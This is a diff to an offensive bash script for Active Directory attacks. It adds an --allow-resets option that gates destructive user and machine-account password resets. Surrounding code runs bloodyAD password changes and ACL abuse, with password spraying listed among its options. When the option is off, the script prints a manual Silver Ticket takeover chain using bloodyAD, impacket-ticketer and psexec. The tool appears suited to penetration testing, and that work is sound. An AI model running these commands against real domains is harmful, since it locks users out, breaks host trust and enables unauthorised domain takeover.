@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.50.1"
+readonly VERSION="1.51.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -171,6 +171,8 @@ CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_
 GUEST_ENABLED=0; ANON_U=""; ANON_P=""
 STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
 DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
+ALLOW_RESET=0       # 1 = permit DESTRUCTIVE password resets (user + computer/machine pw).
+                    # OFF even under --abuse: resets break real accounts/hosts. Opt-in only.
 DEEP_CVE=0          # 1 = run slow/noisy CVE modules such as PrintNightmare
 DO_CLEANUP=0        # 1 = revert every change this tool made, then exit
 ROLLBACK_FILE=""    # records undo actions for responsible cleanup
@@ -3860,6 +3862,12 @@ _abuse_group() {
 _abuse_user() {
     local target="$1"; local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to reset '$target' password)"; return; }
+    # Force-changing a user's password locks the real user out (original unknown) →
+    # DESTRUCTIVE. Opt-in only. Prefer non-destructive takeovers (Shadow Creds, roast).
+    if [[ "$ALLOW_RESET" != "1" ]]; then
+        warn "  Force-reset of '${target}' skipped — DESTRUCTIVE (locks the user out). Use ${C_BOLD}--allow-resets${C_RESET}, or take it over non-destructively (Shadow Creds / targeted Kerberoast)."
+        return 1
+    fi
     abuse_confirm "  Force-reset password of '${target}' (DESTRUCTIVE — original unknown)?" || return
     run "bloodyAD ${ba[*]} set password '$target' '$PIVOT_PW'"
     if bloodyAD "${ba[@]}" set password "$target" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qi 'success\|changed'; then
@@ -4116,6 +4124,14 @@ _abuse_computer_silver() {
     local host="${target%\$}" newpw="Ad4Pwn_C0mp_99"
     [[ -n "${COMP_SILVER_DONE[${target,,}]:-}" ]] && return 1
     COMP_SILVER_DONE["${target,,}"]=1
+    # Computer takeover REQUIRES resetting the machine password — DESTRUCTIVE (breaks the
+    # host's domain trust). Opt-in only, so the tool never silently bricks a host.
+    if [[ "$ALLOW_RESET" != "1" ]]; then
+        warn "  ${target} takeover needs a DESTRUCTIVE machine-password reset → skipped (run with ${C_BOLD}--allow-resets${C_RESET} to enable)"
+        local _ba; mapfile -t _ba < <(bloody_args)
+        detail "      manual: bloodyAD ${_ba[*]} set password '$target' 'MachinePwn123!' → NT-hash it → impacket-ticketer -spn cifs/${target%\$}.${DOMAIN} Administrator → psexec/RDP"
+        return 1
+    fi
 
     # domain SID = the target's objectSid minus its RID
     local tsid dsid
@@ -7376,6 +7392,10 @@ ${C_CYAN}${C_BOLD}OPTIONS${C_RESET}
   ${C_GREEN}--abuse${C_RESET}        ${C_BOLD}Actively exploit${C_RESET} ACLs: group adds, ForceChangePassword,
                 WriteSPN→Kerberoast, ${C_BOLD}Shadow Credentials${C_RESET}, ${C_BOLD}RBCD${C_RESET}, restore/enable
                 accounts. Off by default → ACLs only reported. Rollback-tracked
+  ${C_GREEN}--allow-resets${C_RESET} Permit ${C_BOLD}DESTRUCTIVE password resets${C_RESET} (user force-change + computer/
+                machine-pw takeover→Silver Ticket). ${C_YELLOW}OFF even under --abuse${C_RESET} — these break
+                real accounts/hosts, so they're opt-in. Without it the step is reported
+                with the manual command instead of executed
   ${C_GREEN}--deep-cve${C_RESET}     Run slower/noisier CVE modules such as PrintNightmare. Default CVE checks
                 stay fast and use spooler/coerce_plus as actionable signals
   ${C_GREEN}--auto-pwn${C_RESET}     Alias for ${C_GREEN}--abuse --spray -y${C_RESET} (kept for convenience; the real
@@ -7476,6 +7496,7 @@ parse_args() {
             --creds-file) CREDS_FILE="$2"; shift 2;;
             --users-file) USERS_FILE="$2"; shift 2;;
             --spray) SPRAY_GEN=1; shift;;
+            --allow-resets) ALLOW_RESET=1; shift;;
             --auto-pwn|--full-auto) DO_ABUSE=1; AUTO_YES=1; SPRAY_GEN=1; shift;;
             --crack) DO_CRACK=1; shift;;
             --no-crack) DO_CRACK=0; shift;;
